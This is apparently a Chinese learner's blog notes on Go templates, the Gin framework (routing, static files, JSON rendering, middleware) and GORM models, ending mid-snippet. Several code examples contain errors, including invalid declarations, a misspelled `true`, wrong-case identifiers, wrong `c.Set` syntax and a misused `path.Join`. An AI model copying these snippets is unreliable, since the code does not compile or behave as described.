        <content type="html"><![CDATA[<h2 id="1-Gin框架"><a href="#1-Gin框架" class="headerlink" title="1. Gin框架"></a>1. Gin框架</h2><h3 id="1-1-初识"><a href="#1-1-初识" class="headerlink" title="1.1 初识"></a>1.1 初识</h3><ol><li><p>读取文件可以使用content , _=ioutil.ReadFile(“xxx.txt”)方式，比os中的read简单</p></li><li><p>例如，我们现在要编写一个管理书籍的系统，我们可以查询对一本书进行查询、创建、更新和删除等操作，我们在编写程序的时候就要设计客户端浏览器与我们Web服务端交互的方式和路径。按照经验我们通常会设计成如下模式：</p><table><thead><tr><th>请求方法</th><th>URL</th><th>含义</th></tr></thead><tbody><tr><td>GET</td><td>/book</td><td>查询书籍信息</td></tr><tr><td>POST</td><td>/create_book</td><td>创建书籍记录</td></tr><tr><td>POST</td><td>/update_book</td><td>更新书籍信息</td></tr><tr><td>POST</td><td>/delete_book</td><td>删除书籍信息</td></tr></tbody></table><p>同样的需求我们按照RESTful API设计如下：</p><table><thead><tr><th>请求方法</th><th>URL</th><th>含义</th></tr></thead><tbody><tr><td>GET</td><td>/book</td><td>查询书籍信息</td></tr><tr><td>POST</td><td>/book</td><td>创建书籍记录</td></tr><tr><td>PUT</td><td>/book</td><td>更新书籍信息</td></tr><tr><td>DELETE</td><td>/book</td><td>删除书籍信息</td></tr></tbody></table><blockquote><p>通过不同的方法代表不同的动作，这样就不用建立多个文件，维护代码方便</p></blockquote></li></ol><h3 id="1-2-template"><a href="#1-2-template" class="headerlink" title="1.2 template"></a>1.2 template</h3><ol><li><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">创建一个main.<span class="keyword">go</span>文件，在其中写下HTTP server端代码如下：</span><br><span class="line"><span class="comment">// main.go</span></span><br><span class="line"><span class="comment">//原生的模板渲染 </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sayHello</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"><span class="comment">// 解析指定文件生成模板对象，即解析模板</span></span><br><span class="line">tmpl, err := template.ParseFiles(<span class="string">&quot;./hello.tmpl&quot;</span>)<span class="comment">//tmp1为生成的模板对象</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;create template failed, err:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 利用给定数据渲染模板，并将最终渲染成形的html写入w，由w来返回给客户端</span></span><br><span class="line">tmpl.Execute(w, <span class="string">&quot;沙河小王子&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/&quot;</span>, sayHello)</span><br><span class="line">err := http.ListenAndServe(<span class="string">&quot;:9090&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;HTTP server failed,err:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>条件判断</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="keyword">if</span> pipeline&#125;&#125; T1 &#123;&#123;end&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="keyword">if</span> pipeline&#125;&#125; T1 &#123;&#123;<span class="keyword">else</span>&#125;&#125; T0 &#123;&#123;end&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="keyword">if</span> pipeline&#125;&#125; T1 &#123;&#123;<span class="keyword">else</span> <span class="keyword">if</span> pipeline&#125;&#125; T0 &#123;&#123;end&#125;&#125;</span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line">&#123;&#123;<span class="keyword">if</span> lt .ma.age <span class="number">18</span>&#125;&#125;</span><br><span class="line">好好学习</span><br><span class="line">&#123;&#123;<span class="keyword">else</span>&#125;&#125;</span><br><span class="line">好好工作</span><br><span class="line">&#123;&#123;end&#125;&#125; <span class="comment">//记住判断符号在前面</span></span><br></pre></td></tr></table></figure></li><li><p>range遍历</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="keyword">range</span> $index,$value := .hobby&#125;&#125;<span class="comment">//hobby为预定义切片，其他类型也可以</span></span><br><span class="line">&lt;p&gt; &#123;&#123;$index&#125;&#125; - &#123;&#123;$hobby&#125;&#125;&lt;/p&gt; <span class="comment">//执行动作</span></span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>index取值//针对数组，切片或者字典</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;index .hobby <span class="number">2</span>&#125;&#125;<span class="comment">//取出hobby切片中下标为2的值</span></span><br></pre></td></tr></table></figure></li><li><p>模板添加添加自定义函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//当前目录下有一个f.tmpl的模板文件</span></span><br><span class="line">k:= <span class="function"><span class="keyword">func</span><span class="params">(name <span class="keyword">string</span>)</span><span class="params">(<span class="keyword">string</span>,error)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> name+<span class="string">&quot;年轻又帅气！&quot;</span>,<span class="literal">nil</span></span><br><span class="line">&#125;<span class="comment">//自定义函数</span></span><br><span class="line">t := template.New(<span class="string">&quot;f.tmpl&quot;</span>)<span class="comment">//创建一个名字为f.tmpl的模板对象，名字一定要和模板名字能对应上，此时可以理解为创建了一个模板对象，其名字为f.tmpl，但是内容啥的都为空</span></span><br><span class="line">t.Funcs(template.FuncMap&#123;</span><br><span class="line"><span class="string">&quot;kua99&quot;</span>:k</span><br><span class="line">&#125;)<span class="comment">//告诉模板引擎，我现在给t添加了一个自定义函数，通过kua99来用</span></span><br><span class="line"><span class="comment">//解析模板</span></span><br><span class="line">_,err := t.ParseFiles(<span class="string">&quot;./f.tmpl&quot;</span>)<span class="comment">//解析模板，可以理解为给t添加了模板内容，现在t这个模板对象既有名字又有可用自定义函数，又有内容</span></span><br><span class="line">name := <span class="string">&quot;小王子&quot;</span></span><br><span class="line">t.Execute(w,name)<span class="comment">//渲染模板并发送给w</span></span><br></pre></td></tr></table></figure><p>其中f.tmpl内容如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">...html</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>&#123;&#123;kua99 .&#125;&#125;<span class="tag">&lt;/<span class="name">body</span>&gt;</span>//在模板文件中运用自定义函数</span><br></pre></td></tr></table></figure></li><li><p>当一个模板1嵌套了另一个模板2，在解析模板时参数顺序要写对，先是1后是2</p><p>当一个模板1继承了另一个模板2，在解析模板时参数顺序要写对，先是2后是1</p></li><li><p>当模板解析时，解析了不止一个模板，则在渲染模板时要用ExcuteTemplate(),并在参数中指定渲染其中哪一个</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/image-20210711162404017.png"></p></li><li><p>记着在模板继承的时候根模板中块代码那块有个.  以及在子模版中继承时也有个.</p></li><li><p>注意：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">t,err := template.ParseFiles(<span class="string">&quot;./template/base.tmpl&quot;</span>,<span class="string">&quot;./template/xiaoming.tmpl&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;err= &quot;</span>,err)</span><br><span class="line">&#125;</span><br><span class="line">name := <span class="string">&quot;xiaoming&quot;</span></span><br><span class="line">t.ExecuteTemplate(w,<span class="string">&quot;xiaoming.tmpl&quot;</span>,name)<span class="comment">//第二个参数直接写文件名即该模板define的名字，不要写./template/xiaoming.tmpl路径</span></span><br></pre></td></tr></table></figure></li><li><p>推荐新建一个项目时打开一个新的goland窗口</p><p>以上为用net/http包进行模板渲染的东西，以下为利用gin框架进行模板渲染</p></li></ol><blockquote><p><a href="https://www.liwenzhou.com/posts/Go/go_template/">https://www.liwenzhou.com/posts/Go/go_template/</a></p></blockquote><hr><h3 id="1-3-gin框架渲染"><a href="#1-3-gin框架渲染" class="headerlink" title="1.3 gin框架渲染"></a>1.3 gin框架渲染</h3><ol><li><p>gin中已经定义好了一个map方便用户使用，该map为gin.H{}</p></li><li><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;<span class="comment">//gin框架下的模板渲染 1.定义模板 2.解析模板 3.渲染模板</span></span><br><span class="line">r := gin.Default()</span><br><span class="line">    r.LoadHTMLFiles(<span class="string">&quot;templates/posts/index.html&quot;</span>, <span class="string">&quot;templates/users/index.html&quot;</span>)<span class="comment">//解析模板</span></span><br><span class="line"><span class="comment">//r.LoadHTMLGlob(&quot;templates/**/*&quot;)，其中**表示所有目录，*表示所有文件</span></span><br><span class="line">r.GET(<span class="string">&quot;/posts/index&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;<span class="comment">//该匿名函数为渲染模板,将c就当作那条请求链接</span></span><br><span class="line">c.HTML(http.StatusOK, <span class="string">&quot;posts/index.html&quot;</span>, gin.H&#123;</span><br><span class="line"><span class="string">&quot;title&quot;</span>: <span class="string">&quot;posts/index&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;users/index&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;<span class="comment">//该匿名函数为渲染模板</span></span><br><span class="line">c.HTML(http.StatusOK, <span class="string">&quot;users/index.html&quot;</span>, gin.H&#123;</span><br><span class="line"><span class="string">&quot;title&quot;</span>: <span class="string">&quot;users/index&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.Run(<span class="string">&quot;:8080&quot;</span>)<span class="comment">//服务跑起来</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>静态文件：html页面上用到的样式文件.css js文件 图片</p></li><li><p>添加预定义函数必须在解析模板之前</p></li><li><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.Static(<span class="string">&quot;/xxx&quot;</span>, <span class="string">&quot;./static&quot;</span>)<span class="comment">//第二个目录为静态文件的目录，第一个参数可以理解为给./static取了个别名，在html文件中出现/xxx就用./static替换</span></span><br></pre></td></tr></table></figure></li><li><p>如果没有给一个模板起名字，那么默认就是文件名</p></li><li><p>小米网站搭建项目xiaomi</p></li><li><p>json渲染</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line"></span><br><span class="line"><span class="comment">// gin.H 是map[string]interface&#123;&#125;的缩写</span></span><br><span class="line">r.GET(<span class="string">&quot;/someJSON&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// 方式一：自己拼接JSON</span></span><br><span class="line">c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hello world!&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">r.GET(<span class="string">&quot;/moreJSON&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// 方法二：使用结构体</span></span><br><span class="line"><span class="keyword">type</span> msg <span class="keyword">struct</span> &#123;</span><br><span class="line">Name    <span class="keyword">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">Message <span class="keyword">string</span></span><br><span class="line">Age     <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">var</span> msg1 := msg&#123;</span><br><span class="line">            Name:<span class="string">&quot;xiaoming&quot;</span>,</span><br><span class="line">            Message:<span class="string">&quot;abc&quot;</span>,</span><br><span class="line">            Age:<span class="number">18</span></span><br><span class="line">        &#125;</span><br><span class="line">c.JSON(http.StatusOK, msg1)</span><br><span class="line">&#125;)</span><br><span class="line">r.Run(<span class="string">&quot;:8080&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>参数绑定：前端传过来的参数在后端自动生成一个结构体存储相应参数</p></li><li><p>gin框架有两种字符串拼接方式</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一种方式,eg:</span></span><br><span class="line">dst := fmt.Sprintf(<span class="string">&quot;./%s&quot;</span>,f.filename)</span><br><span class="line"><span class="comment">//第二种方式,eg:</span></span><br><span class="line">dst := path.Join(<span class="string">&quot;./%s&quot;</span>,f.filename)</span><br></pre></td></tr></table></figure></li><li><p>goland中unhandle error指的是没有处理返回的err</p></li></ol><blockquote><p> <a href="https://www.liwenzhou.com/posts/Go/Gin_framework/">https://www.liwenzhou.com/posts/Go/Gin_framework/</a></p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main <span class="comment">//当用户访问home目录时将static文件夹下的index.html返回</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.LoadHTMLGlob(<span class="string">&quot;./templates/*&quot;</span>)<span class="comment">//解析模板</span></span><br><span class="line">r.Static(<span class="string">&quot;/xxx&quot;</span>,<span class="string">&quot;./static&quot;</span>)<span class="comment">//加载静态文件，将index.html中的所有./static替换为/xxx</span></span><br><span class="line">r.GET(<span class="string">&quot;/home&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>,<span class="string">&quot;index.html&quot;</span>,<span class="literal">nil</span>)</span><br><span class="line">&#125;)</span><br><span class="line">r.Run(<span class="string">&quot;:9090&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-4-gin路由"><a href="#1-4-gin路由" class="headerlink" title="1.4 gin路由"></a>1.4 gin路由</h3><ol><li>一个路径加一个请求方法对应一个处理函数就叫一个路由</li><li>r.Any通常配合switch一起用</li></ol><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/image-20210712191205765.png"></p><blockquote><p><a href="https://www.liwenzhou.com/posts/Go/Gin_framework/">https://www.liwenzhou.com/posts/Go/Gin_framework/</a></p></blockquote><h3 id="1-5-中间件"><a href="#1-5-中间件" class="headerlink" title="1.5 中间件"></a>1.5 中间件</h3><ol><li><p>中间件又叫中间件函数，它本质是一个函数，该函数必须是handlerfunc函数类型，换句话说handlerfunc函数类型的函数就可以充当中间件</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//handlerfunc函数类型</span></span><br><span class="line"><span class="keyword">type</span> handlerFunc <span class="function"><span class="keyword">func</span><span class="params">(*context)</span></span></span><br><span class="line"><span class="comment">//eg:</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">m1</span> <span class="params">(c *gin.context)</span></span>&#123;</span><br><span class="line">fmt.<span class="built_in">println</span>(<span class="string">&quot;m1 in....&quot;</span>)</span><br><span class="line">&#125;<span class="comment">//这就是一个中间件</span></span><br></pre></td></tr></table></figure></li><li><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义一个耗时统计中间件</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">indexHandler</span><span class="params">(c *gin.context)</span></span>&#123;</span><br><span class="line">    fmt.<span class="built_in">println</span>(<span class="string">&quot;index in...&quot;</span>)</span><br><span class="line">    c.JSON(http.StatusOK,gin.H&#123;</span><br><span class="line">        <span class="string">&quot;msg&quot;</span>:<span class="string">&quot;index&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//中间件写法1</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">m1</span><span class="params">(c *gin.context)</span></span>&#123;</span><br><span class="line">    fmt.<span class="built_in">println</span>(<span class="string">&quot;m1 in...&quot;</span>)</span><br><span class="line">    start = time.Now()</span><br><span class="line">    c.Next()</span><br><span class="line">    cost := time.Since(start)</span><br><span class="line">    fmt.printf(<span class="string">&quot;耗时:%v\n&quot;</span>,cost )</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//中间件写法2，常用，利用闭包</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">StatCost</span><span class="params">(docheck)</span> <span class="title">gin</span>.<span class="title">HandlerFunc</span></span> &#123;<span class="comment">//可以用docheck作为一个中间件开关</span></span><br><span class="line">    <span class="comment">//数据库连接</span></span><br><span class="line">    <span class="comment">//数据库查询</span></span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> docheck&#123;</span><br><span class="line">            start := time.Now()</span><br><span class="line">            c.Next()</span><br><span class="line">            <span class="comment">// 不调用该请求的剩余处理程序</span></span><br><span class="line">            <span class="comment">// c.Abort()</span></span><br><span class="line">            <span class="comment">// 计算耗时</span></span><br><span class="line">            cost := time.Since(start)</span><br><span class="line">            log.Println(cost)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            c.Next()</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">r:=gin.Default()</span><br><span class="line">    r.use(m1，StatCost(ture))<span class="comment">//全局注册中间件函数m1</span></span><br><span class="line"><span class="comment">//GET(relativePath string,handlers ...HandlerFunc) IRoutes</span></span><br><span class="line">    r.GET(<span class="string">&quot;/index&quot;</span>,indexHandler)<span class="comment">//indexHandler为页面处理函数不是中间件</span></span><br><span class="line">    r.GET(<span class="string">&quot;/shop&quot;</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span>)</span>&#123;<span class="comment">//这里为了方便写成了匿名函数形式</span></span><br><span class="line">        c.JSON(http.StatusOK,gin.H&#123;</span><br><span class="line">            <span class="string">&quot;msg&quot;</span>:<span class="string">&quot;shop&quot;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    r.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>中间件可以定义的不止一个</p></li><li><p>中间件有三种1.全局中间件2.局部中间件：为路由组设置中间件3.单一中间件：为某个路由设置中间件</p></li><li><p>跨中间件取值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">r.use(m1,m2)<span class="comment">//有两个中间件</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">m1</span><span class="params">(c *gin.context)</span></span>&#123;</span><br><span class="line"><span class="comment">//认证成功</span></span><br><span class="line">c.Set(<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xiaoming&quot;</span>)<span class="comment">//可以通过c.Set在请求上下文中设置值，后续的处理函数能够取到该值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">m2</span><span class="params">(c *gin.context)</span></span>&#123;</span><br><span class="line">name,ok := c.Get(<span class="string">&quot;name&quot;</span>)<span class="comment">//后续处理函数通过c。</span></span><br><span class="line"><span class="keyword">if</span> !ok&#123;</span><br><span class="line">name = <span class="string">&quot;匿名用户&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">c.JSON(<span class="number">200</span>,gin.H&#123;</span><br><span class="line"><span class="string">&quot;name&quot;</span>:name,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><blockquote><p><a href="https://www.liwenzhou.com/posts/Go/Gin_framework/">https://www.liwenzhou.com/posts/Go/Gin_framework/</a></p></blockquote><h2 id="1-6-gorm"><a href="#1-6-gorm" class="headerlink" title="1.6 gorm"></a>1.6 gorm</h2><ol><li><p>gorm利用其接口可以帮助我们快速的操作mysql数据库，而省去了自己编写sql语句的步骤</p></li><li><p>一个结构体对应一个表，表名默认就是结构体名称的复数</p><p>例如创建一个user表，只需要创建对应结构体并automigrate就行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">  gorm.Model</span><br><span class="line">  Name         <span class="keyword">string</span></span><br><span class="line">  Age          sql.NullInt64</span><br><span class="line">  Birthday     *time.Time</span><br><span class="line">  Email        <span class="keyword">string</span>  <span class="string">`gorm:&quot;type:varchar(100);unique_index&quot;`</span></span><br><span class="line">  Role         <span class="keyword">string</span>  <span class="string">`gorm:&quot;size:255&quot;`</span> <span class="comment">// 设置字段大小为255</span></span><br><span class="line">  MemberNumber *<span class="keyword">string</span> <span class="string">`gorm:&quot;unique;not null&quot;`</span> <span class="comment">// 设置会员号（member number）唯一并且不为空</span></span><br><span class="line">  Num          <span class="keyword">int</span>     <span class="string">`gorm:&quot;AUTO_INCREMENT&quot;`</span> <span class="comment">// 设置 num 为自增类型</span></span><br><span class="line">  Address      <span class="keyword">string</span>  <span class="string">`gorm:&quot;index:addr&quot;`</span> <span class="comment">// 给address字段创建名为addr的索引</span></span><br><span class="line">  IgnoreMe     <span class="keyword">int</span>     <span class="string">`gorm:&quot;-&quot;`</span> <span class="comment">// 忽略本字段</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数据库中就会出现如下表</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210715164405.png"></p></li><li><p>GORM 默认会使用名为ID的字段作为表的主键，也可设置不加s，或者自定义表明，下方链接有详细步骤</p></li><li><p>当表名和字段名是由两个单词组成时，创建表时会默认给两个单词中间加_，可修改</p></li><li><p>注意所有代码中的表操作可以通过mysql命令：show create table 表名;  来查看该表的配置信息</p></li><li><p><strong>注意：</strong>通过tag定义字段的默认值，在创建记录时候生成的 SQL 语句会排除没有值或值为 零值 的字段。 在将记录插入到数据库后，Gorm会从数据库加载那些字段的默认值。</p><p>举个例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> user = User&#123;Name: <span class="string">&quot;&quot;</span>, Age: <span class="number">99</span>&#125;</span><br><span class="line">db.Create(&amp;user)</span><br></pre></td></tr></table></figure><p>上面代码实际执行的SQL语句是<code>INSERT INTO users(&quot;age&quot;) values(&#39;99&#39;);</code>，排除了零值字段<code>Name</code>，而在数据库中这一条数据会使用设置的默认值<code>小王子</code>作为Name字段的值。</p><ul><li>所有字段的零值, 比如<code>0</code>, <code>&quot;&quot;</code>,<code>false</code>或者其它<code>零值</code>，都不会保存到数据库内，而是会会使用他们的默认值。 如果你想避免这种情况，可以考虑使用指针或实现 <code>Scanner/Valuer</code>接口，比如：</li></ul><h4 id="使用指针方式实现零值存入数据库"><a href="#使用指针方式实现零值存入数据库" class="headerlink" title="使用指针方式实现零值存入数据库"></a>使用指针方式实现零值存入数据库</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用指针</span></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">  ID   <span class="keyword">int64</span></span><br><span class="line">  Name *<span class="keyword">string</span> <span class="string">`gorm:&quot;default:&#x27;小王子&#x27;&quot;`</span></span><br><span class="line">  Age  <span class="keyword">int64</span></span><br><span class="line">&#125;</span><br><span class="line">user := User&#123;Name: <span class="built_in">new</span>(<span class="keyword">string</span>), Age: <span class="number">18</span>))&#125;</span><br><span class="line">db.Create(&amp;user)  <span class="comment">// 此时数据库中该条记录name字段的值就是&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="使用Scanner-Valuer接口方式实现零值存入数据库"><a href="#使用Scanner-Valuer接口方式实现零值存入数据库" class="headerlink" title="使用Scanner/Valuer接口方式实现零值存入数据库"></a>使用Scanner/Valuer接口方式实现零值存入数据库</h4> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td 